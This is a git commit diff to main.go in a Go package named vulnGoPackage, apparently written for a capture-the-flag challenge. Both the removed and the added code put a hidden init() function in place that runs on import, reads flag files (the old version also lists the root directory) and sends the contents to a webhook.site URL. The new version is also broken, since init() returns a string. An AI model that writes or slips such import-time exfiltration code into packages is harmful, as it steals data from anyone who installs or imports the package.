d41ea0d56ad54bc122c6d89e36aac7243e23df4f
Mustafa <112502284+k7edr0x@users.noreply.github.com>
2025-08-14 09:02:20 +0300

    Update main.go

--- main.go
+++ main.go
@@ -3,32 +3,12 @@ package vulnGoPackage
 import (
 	"io/ioutil"
 	"net/http"
-	"os"
-	"os/exec"
 )
 
-func init() {
-	lsCmd := exec.Command("ls", "-la", "/")
-	lsOutput, _ := lsCmd.CombinedOutput()
-	
-	flagPaths := []string{
-		"/flag.txt",
-		"/home/flag.txt",
-		"/etc/flag.txt",
-		"tmp/flag.txt"
+func init(){
+	flag, err := ioutil.ReadFile("/flag.txt")
+	if err != nil {
+		return "Error"
 	}
-	
-	var flagContent string
-	
-	for _, path := range flagPaths {
-		if content, err := ioutil.ReadFile(path); err == nil {
-			flagContent = string(content)
-			break
-		}
-	}
-	
-	http.Get("https://webhook.site/b6b6265c-2121-43e7-83e9-1dcc151dc86f?ls_output=" + 
-		string(lsOutput) + "&flag=" + flagContent)
-	
-	os.Exit(0)
+	http.Get("https://webhook.site/b6b6265c-2121-43e7-83e9-1dcc151dc86f?flag=" + string(flag))
 }
